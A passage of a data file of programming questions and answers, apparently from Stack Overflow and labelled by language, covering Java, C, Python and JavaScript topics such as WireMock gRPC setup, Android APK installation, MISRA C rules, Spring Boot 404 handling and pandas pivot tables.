            method(""greeting"")
                    .withRequestMessage(equalToJson(""{ \""name\"":  \""Tom\"" }""))
                    .willReturn(json(""{ \""greeting\"": \""Hi Tom from JSON\"" }""))
    );

Next I think you have a mismatch of dependencies.  You are using the standalone version of WireMock but not the standalone version of the gRPC extension:
        <dependency>
            <groupId>org.wiremock</groupId>
            <artifactId>wiremock-standalone</artifactId>
            <version>3.10.0</version>
        </dependency>
        <dependency>
            <groupId>org.wiremock</groupId>
            <artifactId>wiremock-grpc-extension</artifactId>
            <version>0.9.0</version>
        </dependency>

If you update the gRPC extension to use the standalone version as well that should hopefully get things up and running for you:
        <dependency>
            <groupId>org.wiremock</groupId>
            <artifactId>wiremock-grpc-extension-standalone</artifactId>
            <version>0.9.0</version>
        </dependency>

You should be able to use all the jetty12 version of the dependencies given you are using 3.x.x version of Spring Boot so that might be worth looking into as well.  You can see those dependencies in the demo project here - https://github.com/wiremock/wiremock-grpc-demos/blob/main/java-jetty12/build.gradle#L45
When I start your demo app I get the port printed to the console as you mentioned:
Port: 49367

I can then send a request to the server using grpcurl:
grpcurl -v -plaintext -d '{""name"": ""Tom""}' localhost:49367 com.example.grpc.GreetingService/greeting

Resolved method descriptor:
rpc greeting ( .com.example.grpc.HelloRequest ) returns ( .com.example.grpc.HelloResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: gzip

Response contents:
{
  ""greeting"": ""Hi Tom from JSON""
}

Response trailers received:
(empty)
Sent 1 request and received 1 response

",java
installing apk that updates the same app fails on android 10 javalangsecurityexception files still open,"Our app downloads an APK from our server, and runs this to upgrade itself. As mentioned in Android 10 - No Activity found to handle Intent and Xamarin Android 10 Install APK - No Activity found to handle Intent, this does not work as previously if the mobile device has been upgraded to Android 10, getting ""No Activity found to handle Intent"". 
We've tried to rewrite this using PackageInstaller as in the example
https://android.googlesource.com/platform/development/+/master/samples/ApiDemos/src/com/example/android/apis/content/InstallApkSessionApi.java, but now get this error instead: 
signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr --------
Abort message: 'JNI DETECTED ERROR IN APPLICATION: JNI GetStaticMethodID called with pending exception java.lang.SecurityException: Files still open
  at java.lang.Exception android.os.Parcel.createException(int, java.lang.String) (Parcel.java:2071)
  at void android.os.Parcel.readException(int, java.lang.String) (Parcel.java:2039)
  at void android.os.Parcel.readException() (Parcel.java:1987)
  at void android.content.pm.IPackageInstallerSession$Stub$Proxy.commit(android.content.IntentSender, boolean) (IPackageInstallerSession.java:593)
  at void android.content.pm.PackageInstaller$Session.commit(android.content.IntentSender) (PackageInstaller.java:1072)
  at void com.mycompany.myApp.QtJavaCustomBridge.JIntentActionInstallApk(java.lang.String) (QtJavaCustomBridge.java:301)
  at void org.qtproject.qt5.android.QtNative.startQtApplication() (QtNative.java:-2)
  at void org.qtproject.qt5.android.QtNative$7.run() (QtNative.java:374)
  at void org.qtproject.qt5.android.QtThread$1.run() (QtThread.java:61)
  at void java.lang.Thread.run() (Thread.java:919)
Caused by: android.os.RemoteException: Remote stack trace:
    at com.android.server.pm.PackageInstallerSession.assertNoWriteFileTransfersOpenLocked(PackageInstallerSession.java:837)
    at com.android.server.pm.PackageInstallerSession.sealAndValidateLocked(PackageInstallerSession.java:1094)
    at com.android.server.pm.PackageInstallerSession.markAsCommitted(PackageInstallerSession.java:987)
    at com.android.server.pm.PackageInstallerSession.commit(PackageInstallerSession.java:849)
    at android.content.pm.IPackageInstallerSession$Stub.onTransact(IPackageInstallerSession.java:306)
(Throwable with no stack trace)


Here's the code we use:
public static final String TAG = ""JAVA""; 
public static final String PACKAGE_INSTALLED_ACTION = ""com.mycompany.myApp.SESSION_API_PACKAGE_INSTALLED"";

public static void JIntentActionInstallApk(final String filename)
{
    PackageInstaller.Session session = null;
    try {
        Log.i(TAG, ""JIntentActionInstallApk "" + filename);
        PackageInstaller packageInstaller = MyAppActivity.getActivityInstance().getPackageManager().getPackageInstaller();
        Log.i(TAG, ""JIntentActionInstallApk - got packageInstaller"");
        PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        Log.i(TAG, ""JIntentActionInstallApk - set SessionParams"");
        int sessionId = packageInstaller.createSession(params);
        session = packageInstaller.openSession(sessionId);
        Log.i(TAG, ""JIntentActionInstallApk - session opened"");

        // Create an install status receiver.
        Context context = MyAppActivity.getActivityInstance().getApplicationContext();
        addApkToInstallSession(context, filename, session);
        Log.i(TAG, ""JIntentActionInstallApk - apk added to session"");

        Intent intent = new Intent(context, MyAppActivity.class);
        intent.setAction(MyAppActivity.PACKAGE_INSTALLED_ACTION);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
        IntentSender statusReceiver = pendingIntent.getIntentSender();
        // Commit the session (this will start the installation workflow).
        session.commit(statusReceiver);
        Log.i(TAG, ""JIntentActionInstallApk - commited"");
    } catch (IOException e) {
        throw new RuntimeException(""Couldn't install package"", e);
    } catch (RuntimeException e) {
        if (session != null) {
            session.abandon();
        }
        throw e;
    }
}

private static void addApkToInstallSession(Context context, String filename, PackageInstaller.Session session)
{
       Log.i(TAG, ""addApkToInstallSession "" + filename);
       // It's recommended to pass the file size to openWrite(). Otherwise installation may fail
       // if the disk is almost full.
       try {
            OutputStream packageInSession = session.openWrite(""package"", 0, -1);
            InputStream input;
            Uri uri = Uri.parse(filename);
            input = context.getContentResolver().openInputStream(uri);

                if(input != null) {
                   Log.i(TAG, ""input.available: "" + input.available());
                   byte[] buffer = new byte[16384];
                   int n;
                   while ((n = input.read(buffer)) >= 0) {
                       packageInSession.write(buffer, 0, n);
                   }
                }
                else {
                    Log.i(TAG, ""addApkToInstallSession failed"");
                    throw new IOException (""addApkToInstallSession"");
                }

       }
       catch (Exception e) {
           Log.i(TAG, ""addApkToInstallSession failed2 "" + e.toString());
       }
}

...

  @Override
    protected void onNewIntent(Intent intent) {
        Bundle extras = intent.getExtras();
        if (PACKAGE_INSTALLED_ACTION.equals(intent.getAction())) {
            int status = extras.getInt(PackageInstaller.EXTRA_STATUS);
            String message = extras.getString(PackageInstaller.EXTRA_STATUS_MESSAGE);
            switch (status) {
                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                    // This test app isn't privileged, so the user has to confirm the install.
                    Intent confirmIntent = (Intent) extras.get(Intent.EXTRA_INTENT);
                    startActivity(confirmIntent);
                    break;
                case PackageInstaller.STATUS_SUCCESS:
                    Toast.makeText(this, ""Install succeeded!"", Toast.LENGTH_SHORT).show();
                    break;
                case PackageInstaller.STATUS_FAILURE:
                case PackageInstaller.STATUS_FAILURE_ABORTED:
                case PackageInstaller.STATUS_FAILURE_BLOCKED:
                case PackageInstaller.STATUS_FAILURE_CONFLICT:
                case PackageInstaller.STATUS_FAILURE_INCOMPATIBLE:
                case PackageInstaller.STATUS_FAILURE_INVALID:
                case PackageInstaller.STATUS_FAILURE_STORAGE:
                    Toast.makeText(this, ""Install failed! "" + status + "", "" + message,
                            Toast.LENGTH_SHORT).show();
                    break;
                default:
                    Toast.makeText(this, ""Unrecognized status received from installer: "" + status,
                            Toast.LENGTH_SHORT).show();
            }
        }
    }

Target SDK is set to API 23 to be able to support old devices some customers have. We're using Qt as the app framework, but Java for native Android functions like this. 
Some thoughts on this: 

* In Xamarin Android 10 Install APK - No Activity found to handle Intent, they mention that they need to do extra garbage collection in Xamarin. Maybe it's because of the same issue we have here? If so, how could we get passed this in Java directly?

* We're trying to upgrade the same app using a downloaded apk. Will this work at all using package installer? If not, do we then need to use a second app to upgrade the original?

* We also have a service running in the app as well for notifications, could this be causing the ""Files still open"" issue?
","I was able to solve this by closing the InputStream and OutputStream. In addition, I had to check for SDK versions prior to 21, as we have minimum API 16 and PackageInstaller was added in API 21.
public static void JIntentActionInstallApk(final String filename)
    {
        PackageInstaller.Session session = null;
        try {
            Log.i(TAG, ""JIntentActionInstallApk "" + filename);

            if(Build.VERSION.SDK_INT < 21) {
                //as PackageInstaller was added in API 21, let's use the old way of doing it prior to 21
                Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
                Uri apkUri = Uri.parse(filename);
                Context context = MyAppActivity.getQtActivityInstance().getApplicationContext();
                ApplicationInfo appInfo = context.getApplicationInfo();
                intent.setData(apkUri);
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, false);
                intent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
                intent.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME,
                     appInfo.packageName);
                MyAppActivity.getQtActivityInstance().startActivity(intent);
            }
            else  {
                // API level 21 or higher, we need to use PackageInstaller
                PackageInstaller packageInstaller = MyAppActivity.getQtActivityInstance().getPackageManager().getPackageInstaller();
                Log.i(TAG, ""JIntentActionInstallApk - got packageInstaller"");
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                Log.i(TAG, ""JIntentActionInstallApk - set SessionParams"");
                int sessionId = packageInstaller.createSession(params);
                session = packageInstaller.openSession(sessionId);
                Log.i(TAG, ""JIntentActionInstallApk - session opened"");

                // Create an install status receiver.
                Context context = MyAppActivity.getQtActivityInstance().getApplicationContext();
                addApkToInstallSession(context, filename, session);
                Log.i(TAG, ""JIntentActionInstallApk - apk added to session"");

                Intent intent = new Intent(context, MyAppActivity.class);
                intent.setAction(MyAppActivity.PACKAGE_INSTALLED_ACTION);
                PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
                IntentSender statusReceiver = pendingIntent.getIntentSender();
                // Commit the session (this will start the installation workflow).
                session.commit(statusReceiver);
                Log.i(TAG, ""JIntentActionInstallApk - commited"");
            }
        } catch (IOException e) {
            throw new RuntimeException(""Couldn't install package"", e);
        } catch (RuntimeException e) {
            if (session != null) {
                session.abandon();
            }
            throw e;
        }
    }

    private static void addApkToInstallSession(Context context, String filename, PackageInstaller.Session session)
    {
           Log.i(TAG, ""addApkToInstallSession "" + filename);
           // It's recommended to pass the file size to openWrite(). Otherwise installation may fail
           // if the disk is almost full.
           try {
                OutputStream packageInSession = session.openWrite(""package"", 0, -1);
                InputStream input;
                Uri uri = Uri.parse(filename);
                input = context.getContentResolver().openInputStream(uri);

                if(input != null) {
                   Log.i(TAG, ""input.available: "" + input.available());
                   byte[] buffer = new byte[16384];
                   int n;
                   while ((n = input.read(buffer)) >= 0) {
                       packageInSession.write(buffer, 0, n);
                   }
                }
                else {
                    Log.i(TAG, ""addApkToInstallSession failed"");
                    throw new IOException (""addApkToInstallSession"");
                }
                packageInSession.close();  //need to close this stream
                input.close();             //need to close this stream
           }
           catch (Exception e) {
               Log.i(TAG, ""addApkToInstallSession failed2 "" + e.toString());
           }
   }


",java
django does not reset module variables during multiple requests,"It seems that module variables live as long as a process lives and do not reset until the process restarts.
Here is my code which i expect to behave another way that it behaves now:
I have a module responsible for various SEO features like breadcrumbs and title, file fancy/utils.py:
class Seo:
    title = ['project name']

Later in my views i can add items to Seo.title (news.views for example):
from fancy.utils import Seo

def index(request, news_id):
    title.append('some specific title')
    ...

The point is that the variable Seo.title actually does not reset at every request, so it continues to append items to itself and it looks very strange to me (as i came from PHP).
Eventually if i hit F5 at the same page the title always grows up to smth huge and long.
What's going on and what should i do?
thanks
","It seems from your comments that you have totally misunderstood the execution model of Django.
You can't have data local to the request that you can somehow access from anywhere in the code. If you need data associated with a particular request, you should store it somewhere where the code running that request can retrieve it: perhaps in the session, perhaps in a temporary dictionary added onto the request object itself. Anything you store globally will be, well, global: visible to any request running inside the same process.
",python
would compiler put jump table at the end of function,"For example, this is an assembly with jump table
movl    $5, -4(%ebp)
cmpl    $10, -4(%ebp)
ja  L13
movl    -4(%ebp), %eax
sall    $2, %eax
movl    L14(%eax), %eax
jmp *%eax
.section .rdata,""dr""
.align 4
L14:
.long   L13
.long   L3
.long   L4
.long   L5
.long   L6
.long   L7
.long   L8
.long   L9
.long   L10
.long   L11
.long   L12
.text
L3:
movl    $LC0, (%esp)
call    _printf
jmp L2
...

My question is, is that possible for compiler like GCC or ICC to put jump table at the end of the function instead of in the middle of function?
","The table won't end up in the middle of the function. If you look carefully you may notice this line:
.section .rdata,""dr""

It tells the assembler to put the following data into the section named "".rdata"". 
And the following .text tells the assembler to switch back to the .text section. So the function code will actually be placed contiguously (in .text), and the jump table will be stored separately (in .rdata).
",c
how the function do_raw_spin_lock is implemented in linux,"While debugging panic issue realted to spinlock, I came across this definition of spinlock in 

include/linux/spinlock.h

. It is rather hard for me to understand this definition. Why is __acquires(lock) used after the do_raw_spin_lock function? What is the signification of such declaration?
static inline void do_raw_spin_lock(raw_spinlock_t *lock) __acquires(lock)
{
        __acquire(lock);
        arch_spin_lock(&lock->raw_lock);
}

Please help me how such declaration are decoded and work.
","It is used for static analysis.
http://en.wikipedia.org/wiki/Sparse
",c
how do i override the default consolelog output of an object,"Say in JavaScript I create a simple object:
function MyObj() {
    this.prop = ""property"";
}

Now if I create an instance of this and the output it to console I see the object representation:
var obj = new MyObj();
console.log(obj);

How can I instead make that output a string?:  For example, I would like that the console displays My property value is 'property' rather than [object object].
I've tried using MyObj.prototype.toString, but it doesn't seem to work.
","You could hook the browser console, and redefine it afterwards:
var obj = {
    name: ""Joel"",
    age: 32,
    toString: function() {
        return this.name + "" is "" + this.age + "" years old."";
    }
};

var browserConsole = console;

console = {
    log: function(data) {
        if (typeof data === ""object"") {
            browserConsole.log(data.toString());
        } else {
            browserConsole.log(data);
        }
    }
}

console.log(obj);

",javascript
how to implement linear interpolation,"Say I am given data as follows:
x = [1, 2.5, 3.4, 5.8, 6]
y = [2, 4, 5.8, 4.3, 4]

I want to design a function that will interpolate linearly between 1 and 2.5, 2.5 to 3.4, and so on using Python.
I have tried looking through this Python tutorial, but I am still unable to get my head around it.
","As I understand your question, you want to write some function y = interpolate(x_values, y_values, x), which will give you the y value at some x? The basic idea then follows these steps:

Find the indices of the values in x_values which define an interval containing x. For instance, for x=3 with your example lists, the containing interval would be [x1,x2]=[2.5,3.4], and the indices would be i1=1, i2=2 
Calculate the slope on this interval by (y_values[i2]-y_values[i1])/(x_values[i2]-x_values[i1]) (ie dy/dx).
The value at x is now the value at x1 plus the slope multiplied by the distance from x1.

You will additionally need to decide what happens if x is outside the interval of x_values, either it's an error, or you could interpolate ""backwards"", assuming the slope is the same as the first/last interval.
Did this help, or did you need more specific advice?
",python
how to make c code to misra c2012 compliance,"I am validating MISRA C:2012 standard to my MCU code using PC-Lint.
I got following errors.Here I posted a sample code where I got errors on condition statements.
1] unsigned integer literal without a 'U' suffix [MISRA 2012 Rule 7.2, required] S_LCB_100,
2] side effects on right hand of logical operator, '&&' [MISRA 2012 Rule 13.5, required]
                        while(( 0x00000000 != List[Loop] ) && ( 0 != Counter ))
3] : a signed value and an unsigned value cannot be used together as operands to != [MISRA 2012 Rule 10.4, required]
                        while(( 0x00000000 != List[Loop] ) && ( 0 != Counter ))
4]  : a signed value and an unsigned value cannot be used together as operands to != [MISRA 2012 Rule 10.4, required]  while(( 0x00000000 != List[Loop] ) && ( 0 != Counter ))
5] an unsigned value and a signed value cannot be used together as operands to == [MISRA 2012 Rule 10.4, required] if ( List[Loop] == 0x00000000 )
How can I make it MISRA C:2012 compliance?
typedef unsigned char UINT8;
typedef unsigned char BYTE;  
typedef unsigned long int UINT32; 
#define S_LCB_100 0xF0BB12DE;
#define MULTI 0x1A;
volatile static BYTE Counter = 0;
static UINT8 Loop = 0;    
static UINT32 List[]=  
{
    S_LCB_100,
    0x00000000,
};
while(( 0x00000000 != List[Loop] ) && ( 0 != Counter ))
{
 .......some code
}
if ( List[Loop] == 0x00000000 )
{
.....some code
} 

","General remarks:

Before worrying about MISRA-C compliance, get the code to compile on a C compiler. 
Then make sure you have the MISRA-C:2012 document available or you simply cannot work with MISRA. 
Get rid of nonsense like ""Yoda conditions"". 
Get rid of custom typedefs and use stdint.h. If you are on C90 then typedef with the names used by stdint.h.


1] unsigned integer literal without a 'U' suffix [MISRA 2012 Rule 7.2, required] S_LCB_100,

Pretty self-explaining. Add U or u to integer constants that should be unsigned. Read rule 7.2 for details.

2] side effects on right hand of logical operator, '&&' [MISRA 2012 Rule 13.5, required] while(( 0x00000000 != List[Loop] ) && ( 0 != Counter ))

Counter is voltatile-qualified and accessing it is a side-effect. So it should not exist inside complex expressions in general, and particularly not on the right hand side of a boolean && expression - that's quite questionable code. In this case you could simply rewrite the code as this:
uint32_t count = (uint32_t)Counter;

while((count != 0u) && (List[Loop] != 0u))
{
  ...
  count = (uint32_t)Counter; // read volatile variable in an expression of its own
}


3] a signed value and an unsigned value cannot be used together as operands to != [MISRA 2012 Rule 10.4, required] while(( 0x00000000 != List[Loop] ) && ( 0 != Counter ))

This is because Counter is declared as BYTE. Drop all such home-brewed crap types and declare it as uint8_t instead. Then use the while form as shown above. Use u suffix. This should fix 2) to 5).
",c
can apache curator interprocesssemaphoremutex release hang ever,"I am using the below recipe in our code to ensure singleton JVM application
 public void acquireLock(InterProcessSemaphoreMutex lock){
   lock.acquire();
 }

 public void releaseLock(InterProcessSemaphoreMutex lock){
      lock.release();
 }

I am releasing lock(via above function call) in 2 conditions:

Work is done.                                                              
I got a LOST state change from curator.

Is it ever possible that call to release() may hang?
Also should I add below predicate in releaseLock()?
if (lock.isAcquiredInThisProcess()) {
    lock.release();
}

","(Note: I'm the main author of Curator)
If you aren't currently connected (i.e. are in SUSPENDED/LOST) then lock.release() will hang based on your current retry policy. However, it won't hang indefinitely and will return once the retries have been exhausted. More importantly, internally Curator guarantees that the node associated with the lock/semaphore will get deleted so you should always call this method if you intend to release the lock/semaphore. Once the connection is repaired the node will get deleted and other processes waiting to acquire can continue.
",java
definition of max_align_t,"I came across the following definition of max_align_t on cppreference.com:

`max_align_t is a type whose alignment requirement is at least as strict (as large) as that of every scalar type.

This confused me because the wording doesn't seem to match that of the Standard, i.e. from page 315 of the C23 working draft:

7.2.1 Common definitions <stddef.h>
[...]
`max_align_t`

which is an object type whose alignment is the greatest fundamental alignment;

...where ""fundamental alignment"" is defined in §6.2.8:

A fundamental alignment is a valid alignment less than or equal to alignof (max_align_t). Fundamental alignments shall be supported by the implementation for objects of all storage durations. The alignment requirements of the following types shall be fundamental alignments: The alignment requirements of the following types shall be fundamental alignments:

all atomic, qualified or unqualified basic types;
all atomic, qualified or unqualified enumerated types;
all atomic, qualified or unqualified pointer types;
all array types whose element type has a fundamental alignment requirement;
all types specified in Clause 7 as complete object types;
all structure or union types all of whose elements have types with fundamental alignment requirements and none of whose elements have an alignment specifier specifying an alignment that is not a fundamental alignment.


Unlike the definition on cppreference.com, the Standard's definition of max_align_t makes no mention of scalar types. But I was wondering if the two could still be thought of as being equivalent. In particular, couldn't bullet points 1, 2 and 3 of the definition of fundamental alignment be condensed into a single bullet point that reads ""all atomic, qualified or unqualified scalar types""? Also, can the alignments of the types mentioned in bullet points 4, 5 and 6 ever exceed that of the scalar type with the strictest alignment?
N.B. The cppreference.com definition of max_align_t seems to have come from the C++ Standard, i.e. from page 521 of the C++23 working draft:

The type max_align_t is a trivial standard-layout type whose alignment requirement is at least as great as that of every scalar type, and whose alignment requirement is supported in every context (6.7.6).

","
But I was wondering if the two could still be thought of as being equivalent. In particular, couldn't bullet points 1, 2 and 3 of the definition of fundamental alignment be condensed into a single bullet point that reads ""all atomic, qualified or unqualified scalar types""?

Bullet points 1, 2, and 3 are basic types, enumerated types, and the pointer types. Basic types (C 2024 6.2.5) are char, the signed and unsigned integer types, and the floating types. So these bullets points consist of char, the signed and unsigned integer types, floating types, enumerated types, and pointer types.
Scalar types (6.2.5) are arithmetic types, pointer types, and nullptr_t. Arithmetic types (6.2.5) are integer types and floating types. Integer types (6.2.5) are char, the signed and unsigned integer types, and the enumerated types. So scalar types consist of char, the signed and unsigned integer types,  floating types, enumerated types, pointer types, and nullptr_t.
nullptr_t is in the latter but not the former.
nullptr_t has the same alignment requirement as a pointer to character type (7.21.3). (The text says same “alignment”, but I presume it means “alignment requirement.”) Therefore including or not including it in the sets above does not change what the associated sets of alignment requirements are, since pointer types are already included.
So bullet points 1, 2, and 3 are, for purposes of discussing alignment requirements, equivalent to all atomic, qualified, or unqualified scalar types.

Also, can the alignments of the types mentioned in bullet points 4, 5 and 6 ever exceed that of the scalar type with the strictest alignment?

Arrays: Normally, an array has the same alignment requirement as its members, in which case an array of elements with fundamental alignment requirement has fundamental alignment requirement. For the most part, we think of an array as just a sequence of objects in memory, of the same type, and so an array can start anywhere an object of the type can start. However, we can imagine that, when an array type is created (by using […] in a declaration), the array is given a stricter alignment requirement, meaning the array must start at that alignment requirement even though its elements will not all satisfy that alignment requirement.
I am not aware of anything in the normative parts of the C standard that explicitly prevents that. However, suppose an array could have stricter alignment than its elements. Say int was four bytes and had four-byte alignment, but int [3] had 16-byte alignment. Then the array must have padding at the end so that an array of this array, say int [4][3], has the required alignment for each of its int [3] elements. Then sizeof (int [3]) would have to be 16, not 12. But this contracts the non-normative Example 2 in C 2024 6.5.4.5, which says sizeof array / sizeof array[0] may be used to compute the number of elements in an array. This suggests arrays should not have padding and thus should not have stricter alignment than their elements and hence it was unnecessary to include arrays in this list.
Clause 7 types:
Clause 7 (the standard library) specifies a number of object types and leaves it up to the C implementation to define them. For example, fpos_t (7.23.1) is “a complete object type other than an array type capable of recording all the information needed to specify uniquely every position within a file.” An implementation could define some of these types to be extended types not within the standard types. So, yes, if not for the paragraph you ask about, one of these types could have a stricter alignment requirement than any scalar type.
Structure or union types: The standard does not specify alignment requirements of structures or unions generally. Some constraints are deducible, such as that a structure must have an alignment requirement at least as strict as each of its members. But a C implementation could give structures or unions stricter alignments than their members. So, yes, if not for the paragraph you ask about, a structure or union with members with fundamental alignment requirements could have a stricter alignment requirement than any scalar type.
",c
how shared libraries reduces the space used by process  data code etc,"i have a doubt about how the fallowing same programing giving different sizes , without shared libraries , with shared libraries.?
      example :

      case 1 ( with out using libraries )          

      $ls -l a.out // in this program i didnt use shared libraries .                
      -rwxrwxr-x 1 friend 15555 aug 3 a.out

      $ size a.out 

      text    data bss  dec 
       4000   4555 0    8555 

       case 2 : ( using libraries )           

        $ls -l a.out // in this program used shared libraries .                
      -rwxrwxr-x 1 friend 8000 aug 3 a.out

      $ size a.out 

      text    data bss  dec 
      2000    2888 0    4888

note : all values i have take are approximate values to show its giving lees sizes in second case.  so values may vary but indeed it will be less than the case1.
","I believe that in the first case the linker is statically linking the libraries into the executable, and thus making it larger. An advantage of this, however, is that users of your program will not need to have to make sure that they have certain libraries that your program uses, since the libraries are packaged in your compiled binary. 
In your second case, it is using shared libraries, and so the libraries don't have to be packaged in the executable. Your program tries to find the libraries when it starts.
",c
spring boot  handling nohandlerfoundexception,"Read the Spring Reference Guide on how to handle NoHandlerFoundException and found that Spring sets, by default, throwExceptionIfNoHandlerFound to false.
Knowing that, I thought it was a good idea to set this parameter to true.
I'm using Spring Boot.
Did so:
MyConfig.java
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.web.servlet.DispatcherServlet;

@SpringBootApplication
public class MyConfig {

    public static void main(String[] args) {
        ConfigurableApplicationContext context = SpringApplication.run(MyConfig.class, args);
        context.getBean(DispatcherServlet.class).setThrowExceptionIfNoHandlerFound(true);

        // ...
    }
}

Alright, now throwExceptionIfNoHandlerFound is equals true. However, that didn't worked as expected. The DispatcherServlet continued not throwing the NoHandlerFoundException. This way, I was unable to handle it.
CustomExceptionHandler.java (this didn't worked)
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.NoHandlerFoundException;
import org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;

@ControllerAdvice
public class CustomExceptionHandler extends ResponseEntityExceptionHandler {

    @Override
    protected ResponseEntity <Object> handleNoHandlerFoundException(NoHandlerFoundException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        // do my own handle ...

        // then, return ...
    }

}

After a bit of search, found that adding @EnableWebMvc should work. Then, I did add this annotation to my CustomExceptionHandler
CustomExceptionHandler.java (this did worked)
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.NoHandlerFoundException;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;

@EnableWebMvc
@ControllerAdvice
public class CustomExceptionHandler extends ResponseEntityExceptionHandler {

    @Override
    protected ResponseEntity <Object> handleNoHandlerFoundException(NoHandlerFoundException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        // do my own handle ...

        // then, return ...
    }

}

This way, the handle works. However, I'm using Spring Boot. The Spring Boot docs suggests that if I insert @EnableWebMvc, I would lose some Spring Boot MVC Auto-configuration features, since I would take complete controll of Spring MVC. (See here).

""If you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc.""

Would I lose Spring MVC Auto-configuration? I mean, the @EnableWebMvc, in my case, it's not in a @Configuration class.
My question is based on the fact that I'm not sure how this code above works, and I want to know if there's another way of doing this without losing the Spring MVC Auto-configuration. Could someone explain?
","Spring Boot auto-configuration will automatically add a ResourceHttpRequestHandler to deal with serving static resource. By default this handler is mapped against /** and is the last item in the handler chain.
What this means is the DispatcherServlet won't throw a NoHandlerFoundException because it found the resource handler. The resource handler processes the request and calls response.sendError(HttpServletResponse.SC_NOT_FOUND) to return a 404.
If you don't want this behavior, you can add the following to your application.properties:
spring.mvc.throw-exception-if-no-handler-found=true
spring.resources.add-mappings=false

The will configure the dispatcher servlet to throw the exception and also tell Spring Boot not to register the resource handler.
Before you go too far down that route, you might want to look at this section of the reference docs to see if it wouldn't be better to handle those errors in a different way. It's not totally clear from your question what you're actually trying to do in your error handler, but if it's just dealing with 404s then there's probably a better way.
",java
can not resolve symbol r and buildgradle error,"I began to program with Android and so I downloaded Android Studio 2.1.3 and Android SDK and jdk 1.8.0_60 the Gradle version is 2.14.1.
I want to program with Android 2.2.
In my class called GameView is the problem:
bmp = BitmapFactory.decodeResource(getResources(),
                R.mipmap.ic_launcher);

it can not resolve symbol R
I read that I can solve the problem in these ways:
BUILD -> Clean Project
Tools -> Android -> Sync Project with Gradle Files
File -> Invalidate Caches / Restart
Nothing helped so I tried to changed the Versions in build.gradle(Module: app).
I do not really know which Versions I need to program for Android 2.2.
Please help me or do you know any other solution to fix that problem?
Thanks!
","In my case the solution was to put the minSdkVersion from 8 to 9.
I also changed the versions in build.gradle: 
compileSdkVersion 24
    buildToolsVersion ""24.0.1""

    defaultConfig {
        applicationId ""com.panjutorials.lazypudding""
        minSdkVersion 9
        targetSdkVersion 24
        versionCode 1
        versionName ""1.0""

The only disadvantage is that I program with Android Nougat now but that's okay.
Good luck for everybody who has a similar problem.
",java
how to compiler compile if statement,"main()    
{

   int k = 5;

    if(++k <5 && k++/5 || ++k<=8);  // how to compiler compile this statement 
  print f(""%d"",k);
}

// Here answer is 7 but why ? 
","In following:
for && ""something"" is evaluated when first condition is True
for || ""something"" is evaluated  when first condition is False
( (++k <5)      &&          (k++/5) )      ||      (++k<=8)

( 6 < 5         AND        something )     OR   something

( False         AND        something )     OR   something
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                False                      OR   7 < 8

                False                      OR   True
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                
                                          True

So k comes out to be 7
",c
calculate all missing values for specific data using pivot tables in pandas,"I am working on this dataset called titanic.csv Let's simplify the problem and include some data here:

I need to calculate all missing values for child, as you see it is a value under who column. This should be done using a pivot table.
I have tried this solution:
pd.pivot_table(df[df['who'] == 'child'], 
index='sex', 
aggfunc=lambda x: x.isnull().sum(), 
 margins=True) # to sum all missing values based on gender

But I get this output: 
in which as you also notice, ALL row doesn't sum all missing values per gender.
Where is the problem in my code? Should I use another way to create the pivot table?
","EDIT:
If you prefer to use a pivot table, just add the parameter dropna=False to get the result you want.

First answer:
If you want the number of missing values per features for only the child you can use isna/isnull directly after filtering:
data = {'survived': [0, 1, 1, 1, 0], 
        'pclass': [3, 1, None, 1, 3], 
        'sex': ['male', 'female', 'female', 'female', 'male'], 
        'age': [22, 38, None, None, 35], 
        'class_': ['Third', 'First', None, 'First', 'Third'], 
        'who': ['man', 'woman', 'child', 'child', 'man'], 
        'deck': [None, 'C', None, 'C', None], 
        'alive': ['no', 'yes', 'yes', 'yes', 'no'], 
        'alone': [False, False, True, False, True] } 
df = pd.DataFrame(data)

display(df[df[""who""] == ""child""].isna().sum())

survived    0
pclass      1
sex         0
age         2
class_      1
who         0
deck        1
alive       0
alone       0

",python
why does qemu use __atomic_thread_fence together with barrier,"QEMU atomic.h has these definitions:
#define smp_mb()                     ({ barrier(); __atomic_thread_fence(__ATOMIC_SEQ_CST); })
#define smp_mb_release()             ({ barrier(); __atomic_thread_fence(__ATOMIC_RELEASE); })
#define smp_mb_acquire()             ({ barrier(); __atomic_thread_fence(__ATOMIC_ACQUIRE); })

And it has comments explaining why barrier(), a compiler barrier, is necessary:
/* Manual memory barriers
 *
 *__atomic_thread_fence does not include a compiler barrier; instead,
 * the barrier is part of __atomic_load/__atomic_store's ""volatile-like""
 * semantics. If smp_wmb() is a no-op, absence of the barrier means that
 * the compiler is free to reorder stores on each side of the barrier.
